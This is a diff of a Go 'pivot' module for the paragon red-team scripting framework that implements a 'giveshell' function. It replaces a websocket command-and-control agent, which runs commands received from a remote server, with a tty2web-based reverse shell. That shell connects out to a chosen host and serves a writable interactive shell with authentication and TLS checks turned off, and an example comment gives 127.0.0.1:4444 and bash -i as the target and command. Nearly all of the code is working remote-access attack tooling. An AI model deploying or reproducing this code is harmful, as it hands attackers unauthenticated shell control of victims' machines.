@@ -1,15 +1,19 @@
 package pivot
 
 import (
-	"bytes"
+	"context"
 	"fmt"
 	"log"
-	"net/url"
-	"os/exec"
-	"time"
+	"os"
+	"os/signal"
+	"strings"
+	"syscall"
 
-	"github.com/gorilla/websocket"
 	"github.com/kcarretto/paragon/pkg/script"
+
+	"github.com/kost/tty2web/backend/localcommand"
+	"github.com/kost/tty2web/server"
+	"github.com/kost/tty2web/utils"
 )
 
 var debug bool = true
@@ -46,113 +50,111 @@ func giveshell(parser script.ArgParser) (script.Retval, error) {
 	return script.WithError(retVal, retErr), nil
 }
 
-func Giveshell(websocket_host string, shell_cmd string, websocket_path string, websocket_scheme string) (string, error) {
-	log.SetFlags(1)
-
-	fmt.Println("Trying to give shell ", websocket_scheme, "://", websocket_host, websocket_path, " ", shell_cmd)
-
-	//Configure websocket address
-	u := url.URL{Scheme: websocket_scheme, Host: websocket_host, Path: websocket_path}
-	log.Printf("connecting to %s", u.String())
-
-	//Connect to websocket
-	c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
-	if err != nil {
-		log.Fatal("dial:", err)
+//pivot.giveshell("127.0.0.1:4444", "bash", "-i", "")
+func Giveshell(websocket_host string, shell_cmd string, shell_args string, websocket_scheme string) (string, error) {
+	appOptions := &server.Options{}
+	if err := utils.ApplyDefaultValues(appOptions); err != nil {
+		log.Printf("Error applying default value: %v", err)
+		exit(err, 1)
 	}
-	defer c.Close()
+	backendOptions := &localcommand.Options{}
+	if err := utils.ApplyDefaultValues(backendOptions); err != nil {
+		log.Printf("Error applying backend default value: %v", err)
+		exit(err, 1)
+	}
 
-	done := make(chan struct{})
+	appOptions.EnableBasicAuth = false     //c.IsSet("credential")
+	appOptions.EnableTLSClientAuth = false //c.IsSet("tls-ca-crt")
+	appOptions.PermitWrite = true
+	appOptions.Connect = websocket_host
 
-	// Functiton to handle websocket connections
+	err := appOptions.Validate()
+	if err != nil {
+		log.Printf("Error validating options: %v", err)
+		return exit(err, 6)
+	}
+
+	factory, err := localcommand.NewFactory(shell_cmd, strings.Split(shell_args, " "), backendOptions)
+	if err != nil {
+		log.Printf("Error creating local command: %v", err)
+		return exit(err, 3)
+	}
+
+	hostname, _ := os.Hostname()
+	appOptions.TitleVariables = map[string]interface{}{
+		"command":  shell_cmd,
+		"argv":     strings.Split(shell_args, " "),
+		"hostname": hostname,
+	}
+
+	srv, err := server.New(factory, appOptions)
+	if err != nil {
+		log.Printf("Error creating new server: %v", err)
+		return exit(err, 5)
+	}
+
+	ctx, cancel := context.WithCancel(context.Background())
+	gCtx, gCancel := context.WithCancel(context.Background())
+	errs := make(chan error, 1)
+
 	go func() {
-		defer close(done)
-		// Register agent
-		for {
-			fmt.Printf("Registering agent %s", uuid)
-			err := registerAgent(c)
-			if err != nil {
-				log.Printf("Error registering client:\n", err)
-				time.Sleep(5 * time.Second)
-				continue
-			}
-			break
-		}
-		// Wait for commands
-		for {
-			_, message, err := c.ReadMessage()
-			if err != nil {
-				log.Println("read:", err)
-				return
-			}
-			wsMsg := &WsMsg{}
-			err = WsMsgFromJson(string(message), wsMsg)
-			if err != nil {
-				log.Println("Error creating WsMsg from JSON:\n", err)
-			}
-
-			switch wsMsg.MsgType {
-			case Registration:
-				fmt.Println("Confusion")
-			case Command:
-				fmt.Println("Executing command ", wsMsg.Data)
-				commandResponse, err := executeShellCommand(wsMsg.Data)
-				if err != nil {
-					log.Printf("Command execution failed.\n%s\n%s", wsMsg.Data, err)
-				}
-				log.Println("Response:\n", commandResponse)
-				err = sendResponse(c, commandResponse)
-			case Response:
-				fmt.Println("Confusion")
-			default:
-				fmt.Println("No case")
-			}
-
-		}
+		errs <- srv.Run(ctx, server.WithGracefullContext(gCtx))
 	}()
+	err = waitSignals(errs, cancel, gCancel)
 
-	for {
-		// Do nothing so the other thread keeps running.
-		// Can probably remove other thread as only one is really being used.
+	if err != nil && err != context.Canceled {
+		fmt.Printf("Error: %s\n", err)
+		return exit(err, 8)
+	}
+	return exit(nil, 0)
+}
+
+func exit(err error, code int) (string, error) {
+	if err != nil {
+		fmt.Println(err)
+	}
+	return string(code), err
+	// os.Exit(code)
+}
+
+func wait4Signals() {
+	c := make(chan os.Signal)
+	signal.Notify(c, os.Interrupt)
+	select {
+	case sig := <-c:
+		fmt.Printf("Got %s signal. Aborting...\n", sig)
+		// os.Exit(1)
 	}
 }
 
-func registerAgent(conn *websocket.Conn) error {
-	wsMsg := WsMsg{Uuid: string(uuid), Data: "register_me_please", SrcType: Agent}
-	jsonRes, err := wsMsg.ToJson()
-	if err != nil {
-		log.Println("registerAgent wsMsg.ToJson():\n", err)
+func waitSignals(errs chan error, cancel context.CancelFunc, gracefullCancel context.CancelFunc) error {
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(
+		sigChan,
+		syscall.SIGINT,
+		syscall.SIGTERM,
+	)
+
+	select {
+	case err := <-errs:
 		return err
-	}
 
-	err = conn.WriteMessage(websocket.TextMessage, []byte(string(jsonRes)))
-	if err != nil {
-		log.Println("registerAgent conn.WriteMessage\n", err)
-		return err
+	case s := <-sigChan:
+		switch s {
+		case syscall.SIGINT:
+			gracefullCancel()
+			fmt.Println("C-C to force close")
+			select {
+			case err := <-errs:
+				return err
+			case <-sigChan:
+				fmt.Println("Force closing...")
+				cancel()
+				return <-errs
+			}
+		default:
+			cancel()
+			return <-errs
+		}
 	}
-	return nil
-}
-
-func sendResponse(conn *websocket.Conn, responseString string) error {
-	wsMsg := WsMsg{Uuid: uuid, Data: responseString, SrcType: Agent, MsgType: 2}
-	wsJsonMsg, err := wsMsg.ToJson()
-	if err != nil {
-		return err
-	}
-	err = conn.WriteMessage(websocket.TextMessage, []byte(string(wsJsonMsg)))
-	return err
-}
-
-func executeShellCommand(command string) (string, error) {
-	cmd := exec.Command(string(command))
-	var out bytes.Buffer
-
-	//Define where to save theh command stdout
-	cmd.Stdout = &out
-	err := cmd.Run()
-	if err != nil {
-		log.Fatal(err)
-		return "", err
-	}
-	return string(out.String()), nil
 }
